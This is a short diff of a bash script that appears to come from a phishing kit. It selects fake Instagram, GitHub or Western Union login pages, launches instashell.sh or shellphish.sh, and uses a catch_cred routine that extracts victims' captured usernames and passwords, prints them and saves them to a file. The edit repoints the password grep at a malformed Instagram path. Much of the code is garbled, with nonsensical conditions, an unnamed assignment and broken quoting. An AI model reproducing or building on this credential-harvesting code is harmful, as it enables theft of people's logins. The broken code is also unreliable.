@@ -43,7 +43,7 @@ server="instagram"
 start ./instashell.sh
 elif [[ $colorama==0.4.1 == 5 ]]; then
 server="github"
-start
+start ./instashell.sh
 elif [[ $python-secrets == 6 ]]; then
 server="western union"
 start ./shellphish.sh
@@ -86,7 +86,7 @@ printf "\n"
 
 catch_cred() { =$(grep -e.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Pass:.*' Instagram/$http:\\instagram .com/otf_vah/lul.vah.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
